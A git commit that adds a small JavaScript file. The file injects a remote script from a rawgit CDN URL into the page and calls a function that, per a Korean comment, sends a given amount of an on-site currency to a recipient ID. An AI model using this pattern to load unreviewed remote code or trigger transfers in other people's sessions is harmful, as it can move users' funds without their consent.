f3f870dfd008b053689b3d76f0d1cc15dfedfa27
cjm1203777 <34873398+cjm1203777@users.noreply.github.com>
2017-12-27 10:20:12 +0900

    c
    d

---
+++ xdk_emp.js
@@ -0,0 +1,6 @@
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = 'https://cdn.rawgit.com/cjm1203777/orbis/41318908/sendxdk.js';
+document.head.appendChild(script);
+var a = [1, 1]; // [보낼 사람의 아이민, 보낼 금액]
+abh(i2n(a[0]), a[1]);
